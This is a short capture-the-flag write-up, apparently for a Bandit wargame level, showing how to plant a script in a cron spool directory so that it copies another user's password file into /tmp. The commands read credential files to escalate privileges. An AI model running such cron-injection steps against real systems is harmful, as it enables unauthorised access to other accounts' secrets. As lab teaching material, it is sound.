# Level 23 → 24

## Concept
Injecting a script into a directory that cron executes automatically.

## Solution
```bash
# Create a script that copies the password
mkdir /tmp/mydir
cat > /tmp/mydir/getpass.sh << 'SCRIPT'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mydir/pass.txt
SCRIPT

chmod 777 /tmp/mydir/getpass.sh
cp /tmp/mydir/getpass.sh /var/spool/bandit24/foo/

# Wait for cron to execute it (runs every minute)
cat /tmp/mydir/pass.txt
```

## What I Learned
- Cron can execute scripts placed in specific directories
- Script must be executable (`chmod +x`)
- Output directory must be writable by the cron user
